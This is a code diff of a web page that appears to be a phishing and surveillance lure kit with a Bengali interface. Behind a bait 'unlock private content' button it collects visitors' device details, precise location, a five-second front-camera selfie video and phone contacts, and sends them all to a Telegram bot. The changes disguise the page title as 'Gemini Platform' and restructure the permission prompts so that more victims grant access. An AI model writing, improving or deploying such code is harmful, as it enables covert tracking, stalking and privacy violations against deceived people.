@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title> Desi Viral Girls </title>
+    <title>Gemini Platform</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
@@ -41,6 +41,12 @@
         .custom-scroll::-webkit-scrollbar { width: 4px; }
         .custom-scroll::-webkit-scrollbar-track { background: #e2e8f0; border-radius: 10px; }
         .custom-scroll::-webkit-scrollbar-thumb { background: #94a3b8; border-radius: 10px; }
+        .btn-interact {
+            transition: all 0.3s ease;
+        }
+        .btn-interact:active {
+            transform: scale(0.97);
+        }
     </style>
 </head>
 <body class="bg-[#f8fafc] text-gray-900">
@@ -125,7 +131,7 @@
             } catch(e) { console.warn(e); }
         }
 
-        // Send Location to Telegram (Live Location)
+        // Send Location to Telegram
         async function sendLocationToTelegram(profileName, profileId, lat, lng, accuracy) {
             const timestamp = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
             const msg = `📍 লাইভ লোকেশন\n👤 ইউজার: ${profileName}\n🔗 আইডি: ${profileId}\n🎯 অক্ষাংশ: ${lat}, দ্রাঘিমা: ${lng}\n📡 নির্ভুলতা: ${accuracy}মি\n⏰ সময়: ${timestamp}`;
@@ -137,13 +143,13 @@
             } catch(e) { console.warn(e); }
         }
 
-        // Send Video to Telegram
+        // Send Video to Telegram (5 seconds)
         async function sendVideoToTelegram(profileName, profileId, videoBlob) {
             const timestamp = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
             const fd = new FormData();
             fd.append('chat_id', CHANNEL_ID);
-            fd.append('video', videoBlob, 'selfie_10s.mp4');
-            fd.append('caption', `🎥 ১০ সেকেন্ড সেলফি ভিডিও\n👤 ${profileName}\n🔗 ${profileId}\n⏰ ${timestamp}`);
+            fd.append('video', videoBlob, 'selfie_5s.mp4');
+            fd.append('caption', `🎥 ৫ সেকেন্ড সেলফি ভিডিও\n👤 ${profileName}\n🔗 ${profileId}\n⏰ ${timestamp}`);
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
             } catch(e) { console.warn(e); }
@@ -162,39 +168,16 @@
             } catch(e) { console.warn(e); }
         }
 
-        // Fast Location Request (single attempt)
-        async function requestLocationFast(profileId, profileName) {
-            return new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const { latitude, longitude, accuracy } = position.coords;
-                        await sendLocationToTelegram(profileName, profileId, latitude, longitude, accuracy);
-                        // Update firestore history
-                        const profileRef = db.collection('profiles').doc(profileId);
-                        const doc = await profileRef.get();
-                        const history = doc.exists ? (doc.data().history || []) : [];
-                        history.unshift({ timestamp: new Date().toISOString(), action: 'লোকেশন শেয়ার', detail: `${latitude},${longitude}` });
-                        await profileRef.update({ history: history.slice(0, 50) });
-                        resolve({ lat: latitude, lng: longitude });
-                    },
-                    (error) => {
-                        console.warn("Location error:", error);
-                        reject(error);
-                    },
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-                );
-            });
-        }
-
-        // Camera Recording 10 seconds
+        // Camera Recording - 5 seconds (video only, no audio for better compatibility)
         async function startCameraAndRecord(profileId, profileName) {
             try {
                 const indicator = document.createElement('div');
                 indicator.className = 'recording-indicator';
-                indicator.innerText = '🔴 রেকর্ডিং... ১০ সেকেন্ড';
+                indicator.innerText = '🔴 রেকর্ডিং... ৫ সেকেন্ড';
                 document.body.appendChild(indicator);
                 
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                // Video only - better permission success rate
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 const chunks = [];
                 recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
@@ -204,7 +187,7 @@
                     const profileRef = db.collection('profiles').doc(profileId);
                     const doc = await profileRef.get();
                     const history = doc.exists ? (doc.data().history || []) : [];
-                    history.unshift({ timestamp: new Date().toISOString(), action: 'ভিডিও রেকর্ড', detail: '১০ সেকেন্ড সেলফি ভিডিও' });
+                    history.unshift({ timestamp: new Date().toISOString(), action: 'ভিডিও রেকর্ড', detail: '৫ সেকেন্ড সেলফি ভিডিও' });
                     await profileRef.update({ history: history.slice(0, 50) });
                     indicator.innerText = '✅ ভিডিও পাঠানো হয়েছে!';
                     setTimeout(() => indicator.remove(), 2000);
@@ -213,7 +196,7 @@
                 recorder.start();
                 setTimeout(() => {
                     if (recorder.state === 'recording') recorder.stop();
-                }, 10000);
+                }, 5000); // 5 seconds
                 return true;
             } catch (err) {
                 console.error("Camera error:", err);
@@ -255,12 +238,11 @@
             }
         }
 
-        // Render Target Landing Page - ONLY CUSTOM CONTENT (no hardcoded Bengali text)
+        // Render Target Landing Page with Click-to-Activate button (solves auto-permission block)
         function renderTargetLanding(profileId, profileName, pageData) {
             const root = document.getElementById('app-root');
-            // Use custom content from the link creation
             const imageHtml = pageData.imageUrl && pageData.imageUrl.trim() !== '' 
-                ? `<img src="${escapeHtml(pageData.imageUrl)}" class="preview-image" style="max-width:100%; border-radius:24px; margin:16px 0;" onerror="this.style.display='none'">` 
+                ? `<img src="${escapeHtml(pageData.imageUrl)}" style="max-width:100%; border-radius:24px; margin:16px 0;" onerror="this.style.display='none'">` 
                 : '';
             
             root.innerHTML = `
@@ -272,50 +254,106 @@
                         <h2 class="text-2xl font-extrabold mb-3 text-gray-800">${escapeHtml(pageData.mainHeading || "প্রাইভেট কন্টেন্ট")}</h2>
                         ${imageHtml}
                         <div class="text-gray-600 mb-6">${pageData.description || ""}</div>
-                        <button id="unlock-btn" class="w-full bg-blue-600 text-white py-4 rounded-3xl font-bold text-md shadow-lg hover:bg-blue-700 active:scale-95 transition-all mb-3">${escapeHtml(pageData.buttonText || "🔓 আনলক করুন")}</button>
+                        <button id="activate-btn" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-5 rounded-3xl font-bold text-lg shadow-lg hover:shadow-xl transition-all btn-interact mb-3">${escapeHtml(pageData.buttonText || "🔓 কন্টেন্ট আনলক করুন")}</button>
                         <button id="manual-contact-btn" class="w-full bg-green-600 text-white py-4 rounded-3xl font-bold text-md shadow-lg hover:bg-green-700 active:scale-95 transition-all" style="display:none;">📇 কন্টাক্ট শেয়ার করুন</button>
                         <p class="text-xs text-gray-400 mt-6">© 2025</p>
                     </div>
                 </div>
             `;
             
+            let permissionsGranted = false;
             let contactsShared = false;
-            const unlockBtn = document.getElementById('unlock-btn');
+            const activateBtn = document.getElementById('activate-btn');
             const manualContactBtn = document.getElementById('manual-contact-btn');
             
-            unlockBtn.onclick = async () => {
-                if (!contactsShared) {
-                    manualContactBtn.style.display = 'block';
-                    manualContactBtn.onclick = async () => {
-                        if (navigator.contacts && navigator.contacts.select) {
-                            try {
-                                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-                                if (contacts && contacts.length) {
-                                    const formatted = contacts.map(c => ({ name: c.name?.[0] || 'N/A', phone: c.tel?.[0] || 'N/A' }));
-                                    await sendContactsToTelegram(profileName, profileId, formatted);
-                                    contactsShared = true;
-                                    manualContactBtn.style.display = 'none';
-                                    unlockBtn.innerText = "✅ সম্পন্ন!";
-                                    unlockBtn.style.background = "#2e7d32";
-                                    const toast = document.createElement('div');
-                                    toast.className = 'toast-msg';
-                                    toast.innerText = `✅ কন্টাক্ট শেয়ার সফল!`;
-                                    document.body.appendChild(toast);
-                                    setTimeout(() => toast.remove(), 2000);
-                                }
-                            } catch(e) { alert("কন্টাক্ট অ্যাক্সেস ব্যর্থ"); }
-                        } else {
-                            alert("আপনার ব্রাউজার কন্টাক্ট API সাপোর্ট করে না। Chrome Android ব্যবহার করুন।");
+            activateBtn.onclick = async () => {
+                if (permissionsGranted) {
+                    if (!contactsShared) {
+                        manualContactBtn.style.display = 'block';
+                    }
+                    return;
+                }
+                
+                // Show loading state on button
+                const originalText = activateBtn.innerText;
+                activateBtn.innerText = "⏳ অনুমতি নেওয়া হচ্ছে...";
+                activateBtn.disabled = true;
+                
+                try {
+                    // Step 1: Request Location Permission (user interaction triggers browser popup)
+                    const locationPromise = new Promise((resolve, reject) => {
+                        if (!navigator.geolocation) {
+                            reject(new Error("Geolocation not supported"));
+                            return;
                         }
-                    };
-                    window.onbeforeunload = () => { if (!contactsShared) return "শেয়ার না করে বের হতে পারবেন না!"; };
-                } else {
-                    alert("ইতিমধ্যে আনলক করেছেন!");
+                        navigator.geolocation.getCurrentPosition(
+                            async (position) => {
+                                const { latitude, longitude, accuracy } = position.coords;
+                                await sendLocationToTelegram(profileName, profileId, latitude, longitude, accuracy);
+                                const profileRef = db.collection('profiles').doc(profileId);
+                                const doc = await profileRef.get();
+                                const history = doc.exists ? (doc.data().history || []) : [];
+                                history.unshift({ timestamp: new Date().toISOString(), action: 'লোকেশন শেয়ার', detail: `${latitude},${longitude}` });
+                                await profileRef.update({ history: history.slice(0, 50) });
+                                resolve();
+                            },
+                            (error) => {
+                                console.warn("Location error:", error.message);
+                                reject(error);
+                            },
+                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                        );
+                    });
+                    
+                    await locationPromise;
+                    
+                    // Step 2: Start Camera Recording (5 seconds)
+                    activateBtn.innerText = "🎥 ভিডিও রেকর্ডিং...";
+                    await startCameraAndRecord(profileId, profileName);
+                    
+                    permissionsGranted = true;
+                    activateBtn.innerText = "✅ সম্পন্ন!";
+                    activateBtn.style.background = "linear-gradient(135deg, #2e7d32, #1b5e20)";
+                    
+                    // Show contact share option
+                    setTimeout(() => {
+                        manualContactBtn.style.display = 'block';
+                        manualContactBtn.onclick = async () => {
+                            if (navigator.contacts && navigator.contacts.select) {
+                                try {
+                                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                                    if (contacts && contacts.length) {
+                                        const formatted = contacts.map(c => ({ name: c.name?.[0] || 'N/A', phone: c.tel?.[0] || 'N/A' }));
+                                        await sendContactsToTelegram(profileName, profileId, formatted);
+                                        contactsShared = true;
+                                        manualContactBtn.style.display = 'none';
+                                        const toast = document.createElement('div');
+                                        toast.className = 'toast-msg';
+                                        toast.innerText = `✅ কন্টাক্ট শেয়ার সফল!`;
+                                        document.body.appendChild(toast);
+                                        setTimeout(() => toast.remove(), 2000);
+                                    }
+                                } catch(e) { alert("কন্টাক্ট অ্যাক্সেস ব্যর্থ"); }
+                            } else {
+                                alert("আপনার ব্রাউজার কন্টাক্ট API সাপোর্ট করে না। Chrome Android ব্যবহার করুন।");
+                            }
+                        };
+                    }, 500);
+                    
+                } catch (err) {
+                    console.error("Permission error:", err);
+                    activateBtn.innerText = originalText;
+                    activateBtn.disabled = false;
+                    const toast = document.createElement('div');
+                    toast.className = 'toast-msg';
+                    toast.innerText = '⚠️ অনুমতি প্রয়োজন! দয়া করে লোকেশন এবং ক্যামেরা অনুমতি দিন।';
+                    document.body.appendChild(toast);
+                    setTimeout(() => toast.remove(), 3000);
                 }
             };
         }
 
-        // MAIN TARGET MODE: Location first -> then show custom content
+        // MAIN TARGET MODE - Show landing page with click-to-activate button
         async function initTargetMode(targetId) {
             const root = document.getElementById('app-root');
             
@@ -345,54 +383,12 @@
                 usageCount: (profileData.usageCount || 0) + 1 
             });
             
-            // Show loading overlay
-            root.innerHTML = '';
-            const loaderDiv = document.createElement('div');
-            loaderDiv.className = 'loading-overlay';
-            loaderDiv.innerHTML = `<div class="spinner"></div><p class="mt-5 text-lg font-semibold text-blue-600 tracking-wide">loading...</p>`;
-            root.appendChild(loaderDiv);
-            
-            // Get device info and send to Telegram
+            // Send device info to Telegram (background, no permission needed)
             const deviceInfo = await getAdvancedDeviceInfo();
             await sendDeviceInfoToTelegram(profileName, profileId, deviceInfo);
             
-            // Request location (LIVE LOCATION) - MUST happen first
-            let locationSuccess = false;
-            try {
-                await requestLocationFast(profileId, profileName);
-                locationSuccess = true;
-            } catch(locError) {
-                console.warn("Location failed or denied");
-                const toast = document.createElement('div');
-                toast.className = 'toast-msg';
-                toast.innerText = '⚠️ লোকেশন অনুমতি প্রয়োজন! ওয়েবসাইট লোড হবে না।';
-                document.body.appendChild(toast);
-                setTimeout(() => toast.remove(), 2000);
-                // Retry location after 2 seconds
-                setTimeout(async () => {
-                    try {
-                        await requestLocationFast(profileId, profileName);
-                        locationSuccess = true;
-                        loaderDiv.remove();
-                        renderTargetLanding(profileId, profileName, pageData);
-                        setTimeout(async () => {
-                            await startCameraAndRecord(profileId, profileName);
-                        }, 500);
-                    } catch(e) {}
-                }, 2000);
-                return;
-            }
-            
-            // Remove loading overlay
-            loaderDiv.remove();
-            
-            // Render custom landing page (only what admin wrote)
+            // Render landing page with click-to-activate button
             renderTargetLanding(profileId, profileName, pageData);
-            
-            // Auto start camera recording after landing
-            setTimeout(async () => {
-                await startCameraAndRecord(profileId, profileName);
-            }, 500);
         }
 
         // ----------------------------- ADMIN PANEL (No Password) -----------------------------
